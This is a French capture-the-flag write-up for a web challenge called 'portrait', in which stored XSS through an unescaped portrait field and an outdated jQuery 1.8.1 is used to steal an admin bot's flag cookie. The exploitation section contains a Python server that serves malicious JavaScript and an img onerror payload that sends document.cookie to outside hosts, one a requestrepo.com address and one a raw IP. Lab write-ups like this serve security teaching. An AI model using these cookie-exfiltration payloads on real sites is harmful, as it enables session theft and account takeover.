# 🖼️ Challenge : `web/portrait (40 solves remake)`

### 🔐 Niveau de difficulté : **7 / 10**

---

## 🎯 Objectif

Exploiter une **vulnérabilité XSS (Cross-Site Scripting)** pour voler le cookie contenant le **flag** du bot administrateur.

---

## 🧠 Analyse du code source

### 🧍‍♂️ `bot.js`

- Utilise **Playwright** pour simuler un navigateur headless.
    
- Filtre XSS **désactivé** → vulnérable.
    
- Injecte un cookie `flag` dans le contexte navigateur.
    
- Impose un délai de 15 secondes avant de fermer la page.
    
- Met en place un **rate limit** pour éviter les abus.
    

---

### ⚙️ `index.js` (bot)

- Route `/` : formulaire d'envoi d'URL au bot.
    
- Route `/bot` : le bot visite l’URL **si elle correspond à** :
    
    ```regex
    ^http(|s):\/\/52\.188\.82\.43:8070.*
    ```
    
    → Seules les URLs **du site lui-même** sont autorisées.
    
- Vérification avec **regex**, aucune redirection externe autorisée.
    
- Limitation de fréquence sur `/bot`.
    

---

### 🖥️ `index.js` (application principale)

- Serveur Express.js classique :
    
    - Gestion des inscriptions / connexions.
        
    - Gestion des **portraits utilisateur** via MongoDB.
        
- Route `/api/portraits/:username` : récupère les portraits.
    
- Route `/gallery` : affiche les portraits.  
    → Si une image est manquante, une image par défaut (montagne ⛰️) est utilisée.
    
- Utilisation de **jQuery 1.8.1** (vulnérable).
    

---

### 🖼️ `gallery.html`

- Affiche les portraits via les données de l’API.
    
- Gestion des erreurs de chargement d’image avec une image fallback.
    
- Code JavaScript côté client manipulant les entrées **non échappées**.
    

---

## ⚠️ Vulnérabilités identifiées

- Utilisation de **jQuery 1.8.1**, vulnérable à plusieurs attaques XSS.
    
- Le champ `source` d’un portrait est **injecté tel quel** dans le DOM.
    
- Le **bot visite des pages du site contenant du JS** sans protection.
    
- Aucune validation sur le contenu injecté dans les portraits.
    

---

## 💥 Exploitation

### ✅ Étape 1 — Préparer un serveur malveillant

```python
# serveur.py
from http.server import SimpleHTTPRequestHandler, HTTPServer

class CustomHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/malicious.js":
            self.send_response(200)
            self.send_header('Content-Type', 'text/javascript')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Access-Control-Allow-Credentials', 'true')
            self.send_header('X-Content-Type-Options', 'nosniff')
            self.end_headers()
            self.wfile.write(
                b"fetch('https://aojveb29.requestrepo.com/?flag='+document.cookie)"
            )
        else:
            self.send_response(404)
            self.end_headers()

server_address = ('', 8081)
httpd = HTTPServer(server_address, CustomHandler)
print("🚀 Serveur malveillant sur http://localhost:8081")
httpd.serve_forever()
```

---

### ✅ Étape 2 — Créer un portrait avec payload XSS

```html
<img/src=x onerror=fetch("//156.238.233.93:9999/?flag="+document.cookie);>
```

---

### ✅ Étape 3 — Déclencher le bot

Soumettez au bot l’URL de votre galerie :

```
http://52.188.82.43:8070/gallery?username=<votre_nom_utilisateur>
```

---

### ✅ Étape 4 — Récupérer le flag

Le bot exécutera votre JavaScript malveillant.  
Le cookie `flag` sera exfiltré vers votre serveur, et visible dans vos logs :

```
GET /?flag=FLAG{...}
```

---

## 📋 Résumé des étapes

|Étape|Action|
|---|---|
|1️⃣|Démarrer un serveur malveillant|
|2️⃣|Créer un portrait avec payload XSS|
|3️⃣|Soumettre l’URL au bot|
|4️⃣|Observer les requêtes contenant le flag|

---

## 🧩 Conclusion

Ce challenge démontre :

- L’importance de valider les **entrées utilisateur**.
    
- Les **risques liés aux vieilles bibliothèques JS** (ici : jQuery 1.8.1).
    
- Comment une **faille XSS couplée à un comportement automatisé** peut compromettre des données sensibles comme un flag.
    


